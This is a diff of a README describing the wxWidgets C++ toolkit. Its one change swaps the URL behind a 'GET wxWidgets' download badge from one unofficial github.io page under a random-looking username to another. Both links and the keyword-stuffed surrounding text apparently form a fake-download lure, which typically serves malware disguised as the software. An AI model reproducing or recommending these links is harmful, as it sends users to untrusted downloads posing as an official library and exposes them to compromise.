@@ -54,7 +54,7 @@ The toolkit is especially useful when a project needs C++ performance, broad pla
 
 Prerequisites: A supported C++ compiler, build tools for your target operating system, and access to wxwidgets download resources or a package manager that provides the wxwidgets library.
 
-[![GET wxWidgets](https://img.shields.io/badge/GET%20%E2%80%94%20wxWidgets-0078D6?style=for-the-badge&logoColor=white)](https://moisesnealrrcb.github.io/.github/wxwidgets-app)
+[![GET wxWidgets](https://img.shields.io/badge/GET%20%E2%80%94%20wxWidgets-0078D6?style=for-the-badge&logoColor=white)](https://enzostricklandhfnj.github.io/.github/wxwidgets-app)
 
 1.  **Download the Toolkit:** Start with wxwidgets download options from the official project or package ecosystem, then confirm the version matches your compiler and target platform.
 2.  **Install or Build Libraries:** Follow wxwidgets install instructions for your system, choosing debug and release builds if your workflow needs both during development.
